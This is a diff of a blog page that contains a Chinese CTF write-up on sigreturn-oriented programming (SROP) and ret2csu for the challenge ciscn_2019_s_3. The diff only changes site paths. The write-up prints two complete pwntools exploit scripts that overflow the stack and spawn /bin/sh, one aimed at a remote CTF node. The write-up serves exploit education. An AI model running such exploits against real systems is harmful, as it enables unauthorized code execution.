@@ -5,40 +5,40 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="SROP可以在gadgets很少的时候的栈利用里使用，近期学习linux后，明白了程序进行系统调用时，状态会从用户态切换到内核态。而切换的实质是将用户态的寄存器保存。而返回的时候，再重新恢复用户态的寄存器。系统调用signreturn，是内核态恢复到用户态；它的具体操作是**[从用户的栈中弹出寄存器的值]{.mark}**。因此，如果栈能被我们控制，然后我们能够构造signreturn的系统调用，">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SROP">
-<meta property="og:url" content="https://github.com/ha1vk/2020/04/05/SROP/index.html">
+<meta property="og:url" content="https://github.com/2020/04/05/SROP/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="SROP可以在gadgets很少的时候的栈利用里使用，近期学习linux后，明白了程序进行系统调用时，状态会从用户态切换到内核态。而切换的实质是将用户态的寄存器保存。而返回的时候，再重新恢复用户态的寄存器。系统调用signreturn，是内核态恢复到用户态；它的具体操作是**[从用户的栈中弹出寄存器的值]{.mark}**。因此，如果栈能被我们控制，然后我们能够构造signreturn的系统调用，">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/04/05/SROP/image1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/04/05/SROP/image2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/04/05/SROP/image3.png">
+<meta property="og:image" content="https://github.com/2020/04/05/SROP/image1.png">
+<meta property="og:image" content="https://github.com/2020/04/05/SROP/image2.png">
+<meta property="og:image" content="https://github.com/2020/04/05/SROP/image3.png">
 <meta property="article:published_time" content="2020-04-05T15:27:11.000Z">
 <meta property="article:modified_time" content="2025-06-25T08:51:12.044Z">
 <meta property="article:author" content="ha1vk">
 <meta property="article:tag" content="SROP">
 <meta property="article:tag" content="ret2csu">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/04/05/SROP/image1.png">
+<meta name="twitter:image" content="https://github.com/2020/04/05/SROP/image1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/04/05/SROP/">
+<link rel="canonical" href="https://github.com/2020/04/05/SROP/">
 
 
 <script id="page-configurations">
@@ -100,7 +100,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -121,27 +121,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -199,10 +199,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/04/05/SROP/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/04/05/SROP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -237,7 +237,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -261,17 +261,17 @@
       
         <p>SROP可以在gadgets很少的时候的栈利用里使用，近期学习linux后，明白了程序进行系统调用时，状态会从用户态切换到内核态。而切换的实质是将用户态的寄存器保存。而返回的时候，再重新恢复用户态的寄存器。系统调用signreturn，是内核态恢复到用户态；它的具体操作是**[从用户的栈中弹出寄存器的值]{.mark}**。因此，如果栈能被我们控制，然后我们能够构造signreturn的系统调用，那么就能完成利用。我们的目的就是可以借助signreturn来控制全部的寄存器。</p>
 <h1 id="例题ciscn-2019-s-3"><a href="#例题ciscn-2019-s-3" class="headerlink" title="例题ciscn_2019_s_3"></a>例题ciscn_2019_s_3</h1><p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/04/05/SROP/image1.png" class="">
+<img src="/2020/04/05/SROP/image1.png" class="">
 
 <p>然后，我们用IDA分析一下，存在一个栈溢出漏洞。</p>
-<img src="/ha1vk/2020/04/05/SROP/image2.png" class="">
+<img src="/2020/04/05/SROP/image2.png" class="">
 
 <p>这里，正好我们能控制rax为0xF，x64下的linux的signreturn系统调用号正好为0xF。于是，我们便可以利用SROP来达到利用。</p>
 <p>完整的exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;node3.buuoj.cn&#x27;,26491)</span></span><br><span class="line">csu_call = <span class="number">0x0000000000400580</span></span><br><span class="line">csu_pop = <span class="number">0x000000000040059A</span></span><br><span class="line">mov_rax_sigreturn = <span class="number">0x00000000004004DA</span></span><br><span class="line">syscall = <span class="number">0x0000000000400517</span></span><br><span class="line">vuln = <span class="number">0x00000000004004ED</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(vuln)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr=&#x27;</span>,<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr=&#x27;</span>,<span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(mov_rax_sigreturn) + p64(syscall) + <span class="built_in">str</span>(frame)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>另外一种方法是ret2csu，构造execve的系统调用。这里正好rax能够控制为0x3B，x64下对应的系统调用为execve。</p>
-<img src="/ha1vk/2020/04/05/SROP/image3.png" class="">
+<img src="/2020/04/05/SROP/image3.png" class="">
 
 <p>于是解法二完整的exp为</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26491</span>)</span><br><span class="line">csu_call = <span class="number">0x0000000000400580</span></span><br><span class="line">csu_pop = <span class="number">0x000000000040059A</span></span><br><span class="line">mov_rax_execvecall = <span class="number">0x00000000004004E2</span></span><br><span class="line">syscall = <span class="number">0x0000000000400517</span></span><br><span class="line">vuln = <span class="number">0x00000000004004ED</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(vuln)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr=&#x27;</span>,<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr=&#x27;</span>,<span class="built_in">hex</span>(stack_addr)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(csu_pop)</span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line"><span class="comment">#该存存放syscall指令的地址</span></span><br><span class="line">payload += p64(stack_addr - <span class="number">0xC0</span>) <span class="comment">#r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(mov_rax_execvecall)</span><br><span class="line">payload += p64(csu_call)</span><br><span class="line"><span class="comment">#r12指向这里的rop</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
@@ -283,8 +283,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/SROP/" rel="tag"># SROP</a>
-              <a href="/ha1vk/tags/ret2csu/" rel="tag"># ret2csu</a>
+              <a href="/tags/SROP/" rel="tag"># SROP</a>
+              <a href="/tags/ret2csu/" rel="tag"># ret2csu</a>
           </div>
 
         
@@ -293,11 +293,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/" rel="prev" title="mips/arm pwn初探">
+    <a href="/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/" rel="prev" title="mips/arm pwn初探">
       <i class="fa fa-chevron-left"></i> mips/arm pwn初探
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/04/09/vn_pwn_easyTHeap/" rel="next" title="vn_pwn_easyTHeap(劫持IO_2_1_stdout的虚表)">
+    <a href="/2020/04/09/vn_pwn_easyTHeap/" rel="next" title="vn_pwn_easyTHeap(劫持IO_2_1_stdout的虚表)">
       vn_pwn_easyTHeap(劫持IO_2_1_stdout的虚表) <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -370,20 +370,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -456,30 +456,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
